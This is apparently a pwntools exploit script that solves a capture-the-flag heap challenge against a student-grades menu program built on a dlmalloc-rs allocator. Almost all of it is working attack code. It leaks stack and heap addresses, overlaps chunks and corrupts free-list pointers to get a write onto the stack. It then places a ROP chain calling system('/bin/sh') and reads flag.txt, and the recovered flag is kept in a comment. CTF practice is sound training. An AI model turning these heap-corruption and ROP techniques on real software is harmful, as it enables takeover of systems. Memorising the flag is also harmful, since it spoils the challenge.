#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or '', checksec=True)
# libc = exe.libc
context.terminal = ["tmux", "splitw", "-h", "-l", "70%"]
# context.encoding = 'utf-8'

gdbscript = '''
# tbreak main
add-symbol-file ./relibc/dlmalloc-rs/target/debug/mylib.o

define show_allocator
    p *('dlmalloc::Dlmalloc<dlmalloc::sys::System>' *) 0x6883e8
end

define s
    stack 150
end

set $main_arena = ('dlmalloc::Dlmalloc<dlmalloc::sys::System>' *) 0x6883e8

# b *student_xray+32

catch syscall exit
continue
'''

# b dlmalloc::dlmalloc::Dlmalloc<A>::check_free_chunk

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or ''
    port = int(args.PORT or 0)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

io = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
rotate_left = lambda x, a, s=64: (x << a) | (x >> (s-a))
rotate_right = lambda x, a, s=64: (x >> a) | (x << (s-a))
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
ptr_mangle = lambda addr, cookie=0: rotate_left(addr ^ cookie, 17)
ptr_demangle = lambda addr, cookie=0: rotate_right(addr, 17) ^ cookie


def trace(func):
    def wrapper(*args, **kwargs):
        info(f"{func.__name__} {args} {kwargs}")
        return func(*args, **kwargs)
    return wrapper

prompt = b'9. Exit\n\n'

sla(prompt, b'5')
leak = rl().decode().strip()
leak = int(leak)
info(f"leak: {hex(leak)}")
stack_leak = leak ^ 0xDEAFBEEF
info(f"stack_leak: {hex(stack_leak)}")

@trace
def add(id, semester, grades_num, department):
    sl(b'1')
    sla(b'Enter student ID, semester and the amount of grades: ', f'{id} {semester} {grades_num}'.encode())
    sla(b'department: ', department)
    return id

def write(id, value):
    sl(b'3')
    value ^= 4
    sla(b'Enter student ID:', f'{id}\n{value}'.encode())

@trace
def xray(id):
    sl(b'2')
    sla(b'Enter student ID:', f'{id}'.encode())

@trace
def free(id):
    sl(b'4')
    sla(b'Enter student ID:', f'{id}'.encode())

def writen(id, value, n):
    for i in range(n):
        write(id, value)

def write_many(id, values):
    for value in values:
        if type(value) == tuple:
            writen(id, value[0], value[1])
        else:
            write(id, value)

add(1, 0, 0x11, b'asdf1')
overwriter = add(2, 0, 0x6, b'asdf2')
add(3, 0, 0x3e, b'asdf3')
add(4, 0, 0x11, b'asdf4')
add(6, 0, 0x3e, b'asdf3')
add(0xf, 0, 0x11, b'keeper')
add(7, 0, 0x3e, b'asdf3')
add(0xe, 0, 0x11, b'keeper')
add(8, 0, 0x3e, b'asdf3')
add(0x10, 0, 0x11, b'keeper')

writen(6, 1, 0x3e)
writen(7, 1, 0x3e)
writen(8, 1, 0x3e)
writen(overwriter, 1, 0x6)
writen(1, 1, 0x11)
writen(4, 1, 0x11)

write(1, 0x1f0 | 0b011)
free(overwriter) # overlaps now with 3
overwriter = add(overwriter, 0, (0x1f0-8)//8, b'overwriter2') # this chunk will overwrite 3rd one

write_many(overwriter, [
    (0x1337, 6),
    0,
    0x201,
    1,
])

writen(3, 2, 0x3e)

free(6)
free(7)
free(8)
free(3)

xray(overwriter)
ru(b'Grade:')
heap_leak = rl().decode().strip()
info(f"heap_leak1: {heap_leak}")

heap_leak = heap_leak.split('Grade: ')[-1]
heap_leak = int(heap_leak) # avg from 9 grades

adder = 6*0x1337+0x201+1

sum_was = heap_leak * 9
info(f"sum_was: {sum_was:#x}")
heap_leak = sum_was - adder
info(f"heap_leak: {heap_leak:#x}")
heap_base = heap_leak - 0x22ec # round to 0x1000
heap_base = (heap_base + 0x10) & ~(0x1000 - 1)
info(f"heap_base: {heap_base:#x}")


# try to cleanup a bit

# free(1) # not possible due to huge value written
# free(overwriter) # not possible due to heap addr in grades arrr
free(4)
writen(0xe,  1, 0x11)
writen(0xf,  1, 0x11)
writen(0x10, 1, 0x11)
free(0xe)
free(0xf)
free(0x10)


# we need to corrupt doubly linked list
# to have write on the program stack and perform a ROP attack

# rules now:
# 5 is  unused
# 1,2 - banned


target_size = 0x9
add(10, 0, 0x21, b'round2 - 10') # it overwrites size of overwriter2
overwriter = add(13, 0, 0x6, b'round2 - overwriter2')
add(11, 0, target_size, b'round2 - 11') 
add(12, 0, 0x18, b'round2 - 12') 
add(6, 0, target_size, b'round2 - 6')

fake_chunk = add(5, 0x51, 0x23, flat(
    p64(heap_base+0x3aa0-0x2120),
    p64(heap_base+0x3980-0x2120),
))
writen(fake_chunk, 1, 0x22)

add(7, 0, target_size, b'round2 - 6')


writen(overwriter, 1, 0x6) # to make later free possible
writen(10, 3, 0x21) # prepare for head overwrite
writen(12, 3, 0x21) # ?
writen(11, 3, target_size) # to make free possible
writen(6, 3, target_size) # to make free possible
writen(7, 3, target_size)


write(10, 0x1d0 | 0b011)
free(overwriter) # overlaps now with 3
overwriter = add(overwriter, 0, (0x1d0-8)//8, b'round2 - overwriter2') # this chunk will overwrite 3rd one

free(6)
free(11)

add(7, 3, 0x3e, b'round2 - head 0x3')
add(3, 0x63, 0x3e, flat(
    p64(0x50),
    p64(0x72)
))

fake_chunk_addr = stack_leak + 0x200
info(f"fake_chunk_addr: {hex(fake_chunk_addr)}")

write_many(overwriter, [
    (1, 6),
    0x0,
    0x51,
    fake_chunk_addr,
    0x6885a8,
    (3, 6),
    0x50,
    0xd2,
    (0x2222, 0x19),
    0x51,
    0x6885a8,
    fake_chunk_addr,
])

add(6, 3, target_size, b'round2 - faker2')

# has grades array on stack
faker = add(11, 0, target_size, b'/bin/sh\x00')

retaddr_from_main = stack_leak + 0x438
write_many(faker, [
    (0x1337, 3),
    0, # grade idx
    0x1337,
    retaddr_from_main,
])

binsh = stack_leak + 0x150
rop = ROP(exe)
poprdi = rop.find_gadget(['pop rdi', 'ret'])[0]

write_many(5, [
    poprdi,
    binsh,
    exe.symbols['system'],
])

pause()
# trigger rop
sl(b'9')
sleep(2)
sl(b'cat flag.txt')

# ping{d1d_y0u_l1k3_my_d3bug_4ss3rt10n5???}


ia()


# smallbin max_size < 0xE9
# prev, next to pointer na start chunka - nie danych jak w libc